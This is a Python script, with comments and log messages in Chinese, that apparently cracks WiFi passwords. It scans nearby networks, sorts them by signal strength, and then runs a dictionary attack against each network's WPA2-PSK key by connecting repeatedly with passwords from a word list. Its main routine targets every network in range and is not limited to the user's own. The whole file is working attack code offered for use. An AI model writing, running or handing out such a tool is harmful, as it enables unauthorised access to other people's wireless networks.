#!/usr/bin/env python3
# -*- coding-utf-8 -*-

import time
import fire
from loguru import logger

import pywifi
from pywifi import const


class WifiPasswordCrack(object):
    """
    密码破解类，用于破解附近的 WiFi 密码，需要安装 pywifi 库，使用方法如下：（待优化）

    Usage:
        python3 wifi_password_crack.py scan_wifi
        python3 wifi_password_crack.py crack_wifi
    
        
    Reference:
        https://zhuanlan.zhihu.com/p/591472321?utm_id=0
    """
    def __init__(self):
        pass

    def scan_wifi(self, scan_time = 10):
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        iface.scan()
        logger.info('正在扫描附近的 WiFi, 请稍后 ...')
        time.sleep(scan_time)
        bsses = iface.scan_results()
        
        wifi_info = {}
        for bss in bsses:
            wifi_ssid = bss.ssid.encode('raw_unicode_escape').decode('utf-8')
            wifi_signal = bss.signal + 100
            wifi_info[wifi_ssid] = wifi_signal
            logger.debug(f"WiFi SSID: {wifi_ssid}, WiFi BSSID: {bss.bssid}, WiFi Signal: {wifi_signal}")
        
        logger.info('扫描完成')
        wifi_info = sorted(wifi_info.items(), key = lambda x: x[1], reverse = True)
        for index, wifi in enumerate(wifi_info):
            logger.info(f"{index} WiFi SSID: {wifi[0]}, WiFi Signal: {wifi[1]}")
        return wifi_info
        
    def crack_wifi_password(self, wifi_name, passwords, iface = None, profile = None, time_diff = 1.5, secs = 0.3):
        if wifi_name is None:
            return
        if iface is None:
            wifi = pywifi.PyWiFi()
            iface = wifi.interfaces()[0]
        if profile is None:
            profile = pywifi.Profile()

        profile.ssid = wifi_name
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        # iface.remove_all_network_profiles()
        tmp_profile = iface.add_network_profile(profile)

        for password in passwords:
            logger.debug(f"正在对 WIFI {wifi_name} 尝试密码: {password}")
            profile.wpa_psk = password
            iface.disconnect()
            while int(iface.status()) == 4:
                pass
            iface.connect(tmp_profile)
            start_time = time.time()
            while time.time() - start_time < time_diff:
                if int(iface.status()) == 2:
                    logger.info(f"密码正确: {password}")
                    yield password
                    return
                else:
                    logger.debug(f"密码错误: {password}")
                    pass
                time.sleep(secs)
            # yield password

    def crack_wifi(self, wifi_names = ['Xiaomi_1C33_5G'], pass_file = "../data/top1000.txt"):
        wifi = pywifi.PyWiFi()
        iface = wifi.interfaces()[0]
        profile = pywifi.Profile()
        pass_file = "../data/passdic.txt"
        wifi_password = {}
        for wifi_name in wifi_names:
            with open(pass_file, "r") as f:
                passwords = f.read().splitlines()
                for password in self.crack_wifi_password(wifi_name, passwords, iface, profile):
                # password = crack_wifi_password(wifi_name, passwords, iface, profile) # 高并发 这里的 password 是一个生成器
                # yield password
                    logger.info(f"WIFI: {wifi_name} 密码: {password}")
                    wifi_password[wifi_name] = password
                    break
                else:
                    logger.info(f"未能找到WIFI: {wifi_name} 的密码")
                    continue
        logger.info(f"找到的WIFI密码: {wifi_password}")
        return wifi_password

    def main(self):
        
        logger.info(' 开始搜索附近 WiFi  ...')
        wifi_info = self.scan_wifi()
        logger.info(f' 搜索附近 WiFi 完成 ...')
        
        logger.info(f' 搜索到 WiFi  {len(wifi_info)} 个 ...')

        wifi_names = [wifi[0] for wifi in wifi_info]

        logger.info(f' 开始破解 WiFi  ...')
        wifi_password = self.crack_wifi(wifi_names)

if __name__ == "__main__":
    fire.Fire(WifiPasswordCrack)